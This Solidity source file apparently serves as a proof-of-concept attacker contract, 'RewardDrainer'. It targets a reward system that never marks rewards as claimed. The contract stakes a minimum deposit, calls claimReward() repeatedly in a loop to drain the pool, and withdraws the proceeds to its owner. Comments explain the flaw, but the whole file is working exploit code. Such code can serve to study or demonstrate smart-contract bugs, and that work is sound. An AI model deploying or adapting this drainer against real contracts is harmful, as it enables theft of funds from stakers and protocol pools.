// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnerableRewardSystem {
    function stake() external payable;
    function claimReward() external;
}

contract RewardDrainer {
    IVulnerableRewardSystem public victim;
    address public owner;

    constructor(address _victim) {
        victim = IVulnerableRewardSystem(_victim);
        owner = msg.sender;
    }

    // The attacker stakes once with the minimum amount.
    function qualify() external payable {
        require(msg.sender == owner, "not owner");
        victim.stake{value: msg.value}();
    }

    // Because the victim contract never marks rewards as claimed,
    // the attacker can call this function many times and drain the pool.
    function drainRewards(uint256 times) external {
        require(msg.sender == owner, "not owner");

        for (uint256 i = 0; i < times; i++) {
            victim.claimReward();
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
